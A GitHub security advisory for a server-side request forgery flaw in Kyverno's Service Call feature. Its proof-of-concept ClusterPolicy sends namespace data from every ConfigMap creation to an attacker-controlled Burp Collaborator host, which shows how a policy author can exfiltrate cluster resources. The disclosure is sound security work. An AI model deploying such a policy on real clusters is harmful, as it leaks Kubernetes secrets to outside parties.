# [H] Kyverno vulnerable to SSRF via Service Calls

## Summary
Severity: High
Advisory: GHSA-459x-q9hg-4gpq
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-04-15
Source: https://github.com/advisories/GHSA-459x-q9hg-4gpq
Type: github-advisory

## Affected
- Go: `github.com/kyverno/kyverno` — affected >=0

## Details
### Summary
An attacker with the ability to create Kyverno policies in a Kubernetes cluster can use Service Call functionality to perform SSRF to a server under their control in order to exfiltrate data.

### Details
According to the documentation, Service Call is intended to address services located inside the Kubernetes cluster, but this method can also resolve external addresses, which allows making requests outside the Kubernetes cluster.

https://kyverno.io/docs/writing-policies/external-data-sources/#variables-from-service-calls

### PoC
Create a slightly modified Cluster Policy from the documentation. In the url we specify the address of a server controlled by the attacker, for example Burp Collaborator.
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: check-namespaces      
spec:
  rules:
  - name: call-extension
    match:
      any:
      - resources:
          kinds:
          - ConfigMap
    context:
    - name: result
      apiCall:
        method: POST
        data:
        - key: namespace
          value: "{{request.namespace}}"
        service:
          url: http://bo3gyn4qwyjnrx87fjnrsd4p7gd71xpm.oastify.com/payload          
    validate:
      message: "namespace {{request.namespace}} is not allowed"
      deny:
        conditions:
          all:
          - key: "{{ result.allowed }}"
            operator: Equals
            value: false
```
Now let's create some configmap:
```bash
kubectl create configmap special-config --from-literal=special.how=very --from-literal=special.type=charm
```
Look at the Burp Collaborator logs:
<img width="723" alt="Снимок экрана 2025-02-21 в 17 31 25" src="https://github.com/user-attachments/assets/9445a71a-6687-430a-8476-3fd546bc2bf2" />


### Impact
An attacker creating such a policy can obtain the contents of all Kubernetes resources created in the cluster, including secrets containing sensitive information.

## References
- https://github.com/kyverno/kyverno/security/advisories/GHSA-459x-q9hg-4gpq
- https://github.com/kyverno/kyverno
- https://pkg.go.dev/vuln/GO-2025-3615
